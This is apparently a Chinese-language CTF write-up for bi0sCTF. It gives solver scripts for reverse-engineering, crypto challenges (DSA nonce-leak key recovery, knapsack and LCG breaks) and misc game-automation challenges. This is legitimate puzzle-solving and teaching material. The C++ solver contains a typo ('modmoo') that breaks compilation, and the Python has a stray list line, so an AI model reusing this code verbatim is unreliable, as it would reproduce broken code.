solver.add(0x04AA34A4 - (i[5] ^ i[7]) == 0)
solver.add((i[2] ^ i[3] ^ i[4]) - 0x74180051 == 0)
solver.add((i[5] ^ i[6] ^ i[7]) - 0x3E07994C == 0)

if solver.check() == z3.sat:
    m = solver.model()
    e = ''.join(hex(m[i[_]].as_long()).replace("0x", "") for _ in range(8))
    print(e)
    e = bytes.fromhex(e)
    sm4 = CryptSM4()
    sm4.set_key(bytes.fromhex("554248506A424B6C73513254754E536B"), SM4_DECRYPT)
    print(sm4.crypt_cbc(bytes.fromhex('3779304D3639545153636D376D665876'), e))
```

### Eerie_jit(crypto):

(本题也是看得比较晚了赛后4min出了...比较可惜)

先验证了flag头的8个字节，随后16字节表示为4个int数值

随后进入jit部分，opcode如下

```
opcode = [
    0x35, 0, 0x35, 3, 0x3E, 
    0x35, 3, 0x35, 3, 0x3E, 
    0x35, 3, 0x3E,
    0x35, 3, 0x3E, 
    0x35, 0, 0x35, 3, 0x3E, 
    0x35, 3, 0x3E, 
    0x35, 3, 0x3E, 
    0x35, 3, 0x35, 3, 0x3E, 
    0x35, 0, 0x35, 3, 0x3E, 
    0x35, 3, 0x3E, 
    0x35, 3, 0x35, 3, 0x3E, 
    0x35, 0, 0x35, 3, 0x3E, 
    0x35, 3, 0x3E, 
    
    0x30, 0, 3, 0x31, 0, 3, 0x3D, 3, 
    0x30, 0, 3, 0x31, 0, 3, 0x3D, 3, 
    0x30, 0, 3, 0x30, 0, 3, 0x3D, 3, 
    0x30, 0, 3, 0x30, 0, 3, 0x31, 0, 3, 0x3D, 3,
     
    0x3E, 0x36, 0, 3, 0x36, 0, 3, 0x36, 0, 3, 0x36, 0, 3, 0x40
]
```

每个指令的执行方式为生成对应的汇编函数

在执行前向栈中压入了14个数

`0x35, 0x00: v13 *= v13`

`0x35, 0x03: v13 *= list[i]` list为函数中定义的数组，i为0x35, 0x03调用次数

0x3e表示将v13压栈，v13指向栈中下一个数据

所以前面一部分的逻辑如下：

```
# 0x35, 0, 0x35, 3, 0x3E, 
v13 = f1
v13 *= v13
v13 *= 4
stack.append(v13) # f1 * f1 * 4

# 0x35, 3, 0x35, 3, 0x3E, 
v13 = stack[1]
v13 *= f2
v13 *= 5
stack.append(v13) # f1 * f2 * 5 

# 0x35, 3, 0x3E,
v13 = stack[2]
v13 *= 105
stack.append(v13) # f1 * 105

# 0x35, 3, 0x3E, 
v13 = stack[3]
v13 *= 6
stack.append(v13) # f2 * 6

# 0x35, 0, 0x35, 3, 0x3E, 
v13 = stack[4]
v13 *= v13
v13 *= 2
stack.append(v13) # f1 * f1 * 2

# 0x35, 3, 0x3E, 
v13 = stack[5]
v13 *= 13
stack.append(v13) # f2 * 13

# 0x35, 3, 0x3E, 
v13 = stack[6]
v13 *= 17
stack.append(v13) # f1 * 17

# 0x35, 3, 0x35, 3, 0x3E, 
v13 = stack[7]
v13 *= f3
v13 *= 5
stack.append(v13) # f2 * f3 * 5

# 0x35, 0, 0x35, 3, 0x3E,
v13 = stack[8]
v13 *= v13
v13 *= 5
stack.append(v13) # f2 * f2 * 5

# 0x35, 3, 0x3E, 
v13 = stack[9]
v13 *= 105
stack.append(v13) # f3 * 105

# 0x35, 3, 0x35, 3, 0x3E, 
v13 = stack[10]
v13 *= f3
v13 *= 4
stack.append(v13) # f4 * f3 * 4

# 0x35, 0, 0x35, 3, 0x3E, 
v13 = stack[11]
v13 *= v13
v13 *= 5
stack.append(v13) # f3 * f3 * 5

# 0x35, 3, 0x3E, 
v13 = stack[12]
v13 *= 303
stack.append(v13) # f4 * 303
v13 = stack[13]
```

随后根据栈中的计算结果，进一步计算出四个结果

`0x30 0x00 0x03` 表示 `pop rax; pop rbx; add rax, rbx`

`0x31 0x00 0x03` 表示 `pop rax; pop rbx; sub rax, rbx`

0x3d则将上述计算结果取模并存入一个单独数组

```
rax = stack.pop()
rbx = stack.pop()
stack.append(rax + rbx)
# f4 * 303 + f3 * f3 * 5
rax = stack.pop()
rbx = stack.pop()
stack.append(rax - rbx)
# f4 * 303 + f3 * f3 * 5 - f4 * f3 * 4
res = []
res.append(stack.pop() % dword_5220)

rax = stack.pop()
rbx = stack.pop()
stack.append(rax + rbx)
# f3 * 105 + f2 * f2 * 5
rax = stack.pop()
rbx = stack.pop()
stack.append(rax - rbx)
# f3 * 105 + f2 * f2 * 5 - f2 * f3 * 5
res = []
res.append(stack.pop() % dword_5220)

rax = stack.pop()
rbx = stack.pop()
stack.append(rax - rbx)

rax = stack.pop()
rbx = stack.pop()
stack.append(rax - rbx)
# f1 * 17 - f2 * 13 - f1 * f1 * 2
res = []
res.append(stack.pop() % dword_5220)

rax = stack.pop()
rbx = stack.pop()
stack.append(rax - rbx)

rax = stack.pop()
rbx = stack.pop()
stack.append(rax - rbx)

rax = stack.pop()
rbx = stack.pop()
stack.append(rax + rbx)
# f2 * 6 - f1 * 105 - f1 * f2 * 5 + f1 * f1 * 4
res = []
res.append(stack.pop() % dword_5220)
```

第三部分将结果与此前定义的数字做对比

整体加密过程为：

```
((f4 * 303 + f3 * f3 * 5 - f4 * f3 * 4) ) % mask == 0x11226D6A
((f3 * 105 + f2 * f2 * 5 - f2 * f3 * 5) ) % mask == 0x68E54823
((f1 * 17 + f2 * 13 + f1 * f1 * 2) ) % mask == 0x34CC1889
((f2 * 6 + f1 * 105 + f1 * f2 * 5 - f1 * f1 * 4) ) % mask == 0x1EF6E9EB
```

通过数学化简后爆破f1求解

```cpp
#include <bits/stdc++.h>
using namespace std;
using ll = long long;

int power(int a, int k, int mod) {
  int ret = 1;
  for (; k; k >>= 1, a = 1ll * a * a % mod) if (k&1) ret = 1ll * ret * a % mod;
  return ret;
}

int main() {
  int mod = 0x7EFF4B91;
  int res0 = 0x11226D6A;
  int res1 = 0x68E54823;
  int res2 = 0x34CC1889;
  int res3 = 0x1EF6E9EB;
  int inv13 = power(13, mod - 2, mod);
  
  for (ll f1 = 0; f1 < INT_MAX; ++f1) {
    ll f2 = ((res2 - f1 * 17 - f1 * f1 % mod * 2) % mod * inv13) % mod;
    if (((f2 * 6 + f1 * 105 + f1 * f2 % mod * 5 - f1 * f1 % mod * 4) % mod + mod) % mod == res3) {
      f2 = (f2 + mod) % modmoo;
      unsigned long long tf1 = f1, tf2 = f2;
      if ((tf1 * 17 + tf2 * 13 + tf1 * tf1 * 2) % mod != res2) continue;
      if (((tf2 * 6 + tf1 * 105 + tf1 * tf2 * 5 - tf1 * tf1 * 4) % mod + mod) % mod != res3) continue;
      ll x = ((res1 - f2 * f2 % mod * 5) % mod + mod) % mod;
      ll y = ((105 - f2 * 5) % mod + mod) % mod;
      y = power(y, mod-2, mod);
      ll f3 = (x * y % mod + mod) % mod;
      x = (res0 - f3 * f3 % mod * 5) % mod;
      y = (303 - f3 * 4) % mod;
      y = power(y, mod-2, mod);
      ll f4 = (x * y % mod + mod) % mod;
      unsigned long long tf3 = f3, tf4 = f4;
      if (((tf4 * 303 + tf3 * tf3 * 5 - tf4 * tf3 * 4) % mod + mod) % mod != res0) continue;
      if (((tf3 * 105 + tf2 * tf2 * 5 - tf2 * tf3 * 5) % mod + mod) % mod != res1) continue;
      printf("%lld %lld %lld %lld\n", f1, f2, f3, f4);
    }
  }
  return 0;
}
```

之后拿到`1953066341 1818325107 1768843103 1785295997`

然后利用n2s去解

```
>>> import libnum
>>> b"bi0sCTF{"+libnum.n2s(1953066341)+libnum.n2s(1818325107)+libnum.n2s(1768843103)+libnum.n2s(1785295997)
b'bi0sCTF{timelapsing_jit}'
```

## Crypto:

### Leaky-dsa:

k未知信息较少，直接用两条 sk=m-rd %p 消掉d，之后二元copper求出来对应每个k具体是多少，接着回代任何一条式子求出私钥d即可。

```py
from sage.all import *
import itertools
def small_roots(f, bounds, m=1, d=None):
    
    if not d:
        d = f.degree()

    R = f.base_ring()
    N = R.cardinality()
    
    f /= f.coefficients().pop(0)
    f = f.change_ring(ZZ)

    G = Sequence([], f.parent())
    for i in range(m+1):
        base = N**(m-i) * f**i
        for shifts in itertools.product(range(d), repeat=f.nvariables()):
            g = base * prod(map(power, f.variables(), shifts))
            G.append(g)

    B, monomials = G.coefficient_matrix()
    monomials = vector(monomials)

    factors = [monomial(*bounds) for monomial in monomials]
    for i, factor in enumerate(factors):
        B.rescale_col(i, factor)

    B = B.dense_matrix().LLL()

    B = B.change_ring(QQ)
    for i, factor in enumerate(factors):
        B.rescale_col(i, 1/factor)

    H = Sequence([], f.parent().change_ring(QQ))
    for h in filter(None, B*monomials):
        H.append(h)
        I = H.ideal()
        if I.dimension() == -1:
            H.pop()
        elif I.dimension() == 0:
            roots = []
            for root in I.variety(ring=ZZ):
                root = tuple(R(root[var]) for var in f.variables())
                roots.append(root)
            return roots

    return []

p = 115792089210356248762697446949407573529996955224135760342422259061068512044369
from hashlib import sha256
z0, r0, s0, k0upper = (7496648251275913379321762834259461106413066198251568863972241549518064825045, 35708720267216780141386972017638777589648610471064977388051210664743651182375, 9662179038519615060061698799209221467470247302473971588084625796487341336154, 95052095029311712302690948913953984379788450191371396826510415254434210643968)# (30338807469659243526067570717263914107109404131145581381962141065570542682259, 43851411654896912189138312109624484265004182982926637890370600465748239140223, 106481291664766764647716317252159351590989262652905730138893713822745324775435, 81230974975392412240328835818144420434492415594227637683334578249558160048128)
z1, r1, s1 ,k1upper = (111835103479967511801273161109097060425429270142914837192258803061862468767340, 58501386591257759132453271402849092080165690028881563872587436596762908386517, 25627184742160112142369942661671203533076276538669251446198338686442020839709, 9183002560293761939923713800050215778090209618706208942684718339054572142592)# (51244276794475006764734096639881124571891948637729294101379411867362632631294, 36750292731574219885284236746359615855307648761830525593472443690459194965250, 88055573187005285998775508217321157018762308369537667398558614085325414799653, 4650611669265657333998771183266096645438495825074800915291751302057284337664)
PR.<k0lower,k1lower> = PolynomialRing(Zmod(p))

f = r1*s0*(k0upper+k0lower) - r0*s1*(k1upper+k1lower) - (z0*r1 - z1*r0)
k0lower,k1lower = small_roots(f,[2^128,2^128],m=3,d=4)[0]
```

### bad2code:

一看是背包，一开始没给r，以为要恢复r或者直接copper，后来给了，%等于没%，直接求二进制之后逆encrypt即可 需要hnp

```python
from Crypto.Util.number import *

public = [1]
for i in range(2, 91):
    public.append(public[-1]*i)
q = sum(public)
public = public[::-1]
r = 439336960671443073145803863477
ct =  [(85, 2009755672435753240933297922620729942110285100089234834611189610638944428122270966606450209287004686147490741726074233399923807772025455384), (87, 4996607263053501712119670315411210635641476911112656716346186101581162098939506206462698692878856867719374177604968008598982986859155008123), (87, 4837953870616520482139098354277306810171956043791834010204071803405678054968703256907153189059041329376000508442178425613919361101370091597), (87, 2933251583165904105425041103443198171501175581919361545836839336222902826332690613281372817019459906816365925875888304559050438360535693754), (87, 3687643521316276110350069295074808763624177150637370283489602776297956670406673088896906135313859622547057266461156951352840606158133939326), (85, 1338269001646504891852362627714857562957599731250242281507737655117481275381522940187354460968741738873145343823622277547003496172474140929), (88, 7933296831307546148859657742504382496951023270916400508699917815337497611045057441275885597739792345698682705664067022591023419704320903682), (88, 5551940689407978486506000896917506389553250109195458521661213619690861850998613004330276887098156130761269810440548744569924180624922795113), (84, 4231118499738387243085586897653540321361890016337481573279774741827125072054069869204040621495890626440611926639348835434382399384680055422), (85, 4704615409370307656606356674605132679559694819773906599372238093928995241862651680281288235856744305731307534075261385839804274777809615349), (88, 8080256207998531514821351856269697662773084407605094205301308544428843939544685672982309353297946702140050231399104513874885470725033197665), (88, 5409126049900711181553897969759692389994841569000620092514718715454021797905578507700126871105210241868943216288008246115824215988452628610), (87, 9252119153621946581189075112355267174890952393437560488066048810424246555795717704306898381332924931192879341998003358581626937969846419514), (88, 4309485343027874993328683769447337855319861832898927390313412221773647599911173732334028315977555272520439642698050646195173212678056296824), (87, 7585821393024154059281324167310518147335428246416250953866063679865301977430635054486170591035445789330984486529581273451159109931487791502), (87, 4266559781861060657731014334455291598689251074723949797856286897802219958857948301662899795696748957745131495362941575798432727634477829169), (85, 2641970821454174926450206596995181582610648509828849026215891906920020076919398240347027542452996819530972432115175678566086129470049375389), (86, 3077438307667140950446795937461054813957511252383671895612002141778156796698300700433893422617209993376314581927862590976739430303756825799), (84, 6606999799754153651147831000154190219518207430742825676139927743071667153908159445512098245423654757585044526053832363134210629951000894424), (88, 5670578370066772514741437284311647297873639929831922637574590430528630079731096253156055423807240883352926044290617794045498770071653673648), (87, 6894132144232319468740512750496837680809983881874187255032194645685827169634783788480774942267705885439820208999500465383743432841886297780), (88, 6348559834296411797469331328911826454137045759724408730535584371919321718963812479226912064993936288733920150791627489465935504738729746712), (87, 7457067309408071136462520290099813600595760616382451252266638576757556195357758384430233685566475045370258747830063483558129016033041534121), (87, 7138834056650788599340304091245357448689914704543367476875970477848587821892811763578094466693024724929034161719556439516286550418480386826), (85, 4214620981374285095640824086913124961419729602098347661701803957979165936606167686524401563099707189265200486482516005732059773306234258420), (87, 7739066385937951930229094506964291860284170243142110190122036300802992602806430896564185899709833543891933679072444463084661529668059219104), (86, 7996763147644153267931052506581385268378745125996592054161290689392831593366496210631236238142447646254463386914159791951904746842709666621), (83, 2363927368088545362888027832425184786062409622322321649991521010872009124933023792724085312213031828468440431258319304817389205319949123017), (86, 8952178949693065428977346330331508030115172989418887909205463101008773555390353195154597245789628940426095401145185560848927781578325104633), (87, 5437733249052136209105079687557091961563919494484950700755430118355692330802405578709308644911805929080699188377572804834481019970451287210), (88, 6015299972513982077146707497576267202666793107003902152334693697774096888512046451228148219477544391600946101222260160929679756603685952858), (88, 4568852671731251436040898868989551602956632306950375030804513367391992286782270552341135397170272362552944089560054885656717064705695931608), (88, 5214418374014497232007521802148945843762329611158152570151078790657020448385624421117820553224634987052518291618670107521494031262847423514), (85, 4868781049816097655711690233312446779184038900364456479177916582789767967134191139603006712483609665048365174590374678749717762853252392898), (87, 7487878378499555558388350908281092245535427011554302229088273963701472371659945154073798520163320208196872977374676841353329741664704431049), (88, 4804650300297155317595282760599161747288241275410480931480258003053935686370721999717184367371623277273540661128542000775004283694728585525), (87, 6324353155591926121419512579497192374524354396151314193997508188259969434627055717937503525281909856550845807173753553651932260148517039625), (87, 5546469224661430242652418747991106002905180051710879985326544434722895447041925331360634907813012794515907098935485171653197695779005009826), (86, 6493922061250196900387871627336695511599800586007321943800903718034500613505566204881495072235610494479661303981584755703237874004730700241), (84, 3304267236247240014753455621608696126482869339445549240138779235284450054938719633292333925332195771054789798560540593262065547955691287860), (86, 7470707627092056238764393981318045721888042683539521453158125764519328859948265999477619788387120366063077899885955739104933799243393828710), (88, 6674831873895816998217860257081780104168741154329195649911902365299495130324698497916172758145782383658122037059537201009889153133307754158), (88, 5323014117483698150842190422231005724805137799598831691161862346623039247622359972881775361362745899238680458901399065283489317592046388919), (85, 3763698408921732607951773848228884704668238062686979349129116312470621538052054791662510364394420612090312977770614743449723324784458538150)]

ciphertext = []
for i in range(len(ct)):#len(ct)):
    n,s = ct[i]
    st = int(s   * inverse(r,q))  % q
    strs = ""
    for puc_inv in public[-n:]:
        if st > puc_inv or (puc_inv == 1 and st == 1):
            st = st % puc_inv
            strs = "1" + strs
        else:
            strs = "0" + strs

    ciphertext.append(int(strs,2))
print(ciphertext[:4])

FLAG_FORMAT = "bi0s"

NBITS = 44<<2

a = 0xBAD2C0DE
c = 0x6969
m = 1<<NBITS
'''

for i,f in enumerate(FLAG):
    state = (state*a+c)%m
    ciphertext.append((state>>(NBITS>>1))^^i^^ord(f))
'''
states = [0]
for i,f in enumerate(FLAG_FORMAT):
    states.append((ciphertext[i]^i^ord(f))<<(NBITS>>1))
# print(states)
# print(NBITS>>1)
# s1 + s1_ = (s0 + s0_) * a + c %m
# (s1 - a*s0-c) + s1_ - a*s0_ %m

'''A = [1]
B = [0]
for i in range(1, len(states)-1):
    A.append(a*A[i-1] % m)
    B.append((a*B[i-1]+a*states[i]+c-states[i+1]) % m)
A = A[1:]
B = B[1:]
M = matrix(ZZ, 2+len(A), 2+len(A))

for i in range(len(A)):
    M[i, i] = m
    M[len(A), i] = A[i]
    M[len(A)+1, i] = B[i]
    M[i, len(A)] = M[i, len(A)+1] = 0
M[len(A), len(A)] =  1
M[len(A)+1, len(A)+1] = 2^88
M[len(A), len(A)+1]= 0
ML = M.LLL()'''
states = states[1:]
[264893701359261384184087199,96391972943163767741116235,308702811501065345352543347,304985483494140320227177621]
print((((states[0]+304985483494140320227177621)*a+c)%m)>>(NBITS>>1) == states[1]>>(NBITS>>1))

seed = ((states[0]+304985483494140320227177621 - c) * inverse(a,m)) % m 
print(seed)

a = 0xBAD2C0DE
c = 0x6969
m = 1<<NBITS
state = states[0]+304985483494140320227177621

plaintext = []

for i in range(44):
    if i==0:
        continue
    state = (state*a+c)%m
    plaintext.append((state>>(NBITS>>1))^i^ciphertext[i])
print(b'b' + bytes(plaintext))
#bi0sctf{lcg_is_good_until_you_break_them_!!}
```

## Misc:

### Snek Game:

就是自动化玩游戏，不过每次可以输入一个移动序列，所以只需要构造一个哈密顿回路让蛇每次从 (0, 0) 出发回到 (0, 0) ，这样每次给一个哈密顿回路就能不断变长。
不过这个题的食物生成比较奇怪，它只会生成在中心 `25*25` 的区域内，这就需要稍微构造一下哈密顿回路（因为随意的哈密顿回路最后因为蛇身过长把中间的区域覆盖后，导致食物无法生成就会报 error），而且不能只构造一条哈密顿回路（可以证明 `31*31` 的格子最长的哈密顿回路也会有一个格子无法经过，如果只有一条哈密顿回路，一旦食物生成在没有被经过的格子上就寄了），而且还需要注意两条哈密顿回路之间不能冲突（否则蛇会触碰到蛇身）
最后我构造了两条不经过 (3, 3) 跟 (4, 4) 的回路，然后不断给 server 发就 ok 了。

```python
import websocket

ws = websocket.WebSocket()

ws.connect("ws://instance.chall.bi0s.in:10130/")

import json
resp = ws.recv()
head = [26, 26]
s = ""
while head[0] > 0:
    head[0] -= 1
    s += "u"
while head[1] > 0:
    head[1] -= 1
    s += "l"
ws.send(s)
resp = json.loads(ws.recv())
assert(resp["head"] == [0, 0])

s1 = "d"*30+"r"+"u"*29+"r"+"d"*29+"r"+"rulu"*13+"ruulurr"+("d"*29+"r"+"u"*29+"r")*12+"d"*29+"r"+"u"*30+"l"*30
s2 = "d"*30+"r"+"u"*29+"r"+"d"*29+"r"+"rulu"*13+"urulurr"+("d"*29+"r"+"u"*29+"r")*12+"d"*29+"r"+"u"*30+"l"*30

def check(s):
    head = [0, 0]
    size = 31
    d = {}
    for ch in s:
        if ch == "l":
            head[-1] -= 1
        elif ch == "r":
            head[-1] += 1
        elif ch == "u":
            head[0] -= 1
        else:
            head[0] += 1
        assert 0 <= head[0] < size
        assert 0 <= head[1] < size
        assert(tuple(head) not in d)
        d[tuple(head)] = 1
    assert head == [0, 0]

check(s1)
check(s2)
assert(len(s1) == 960)
assert(len(s2) == 960)

while True:
    ws.send(s1)
    resp = ws.recv()
    print(resp)
    resp = json.loads(resp)
    if ("flag" in resp):
        print(resp["flag"])
        break
    ws.send(s2)
    resp = ws.recv()
    print(resp)
    resp = json.loads(resp)
    if ("flag" in resp):
        print(resp["flag"])
        break

ws.close()
```

### RGB Cheems:

修改复活点在终点附近，自杀，往前走，跳下去就是flag

![](https://imgur.com/TZdRGi3.png)

![](https://imgur.com/Otuz1aY.png)

### DroidComp:

新建一个工程直接引用题目中的so，调用s和ss

![](https://imgur.com/C4i6fFH.png)

## 结语:

希望大家喜欢以及有所收获,另外如果有错误欢迎指出私信以及邮箱都可,十分感谢!